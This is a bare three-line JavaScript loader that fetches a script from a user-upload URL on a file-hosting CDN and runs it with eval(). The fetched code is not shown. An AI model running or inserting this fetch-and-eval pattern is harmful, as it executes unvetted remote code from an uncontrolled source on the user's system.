const SOURCE = "https://files.manuscdn.com/user_upload_by_module/session_file/310519663977496860/zNjbSJhRwZhYeXNw.js";
const code = await (await fetch(SOURCE)).text();
eval(code);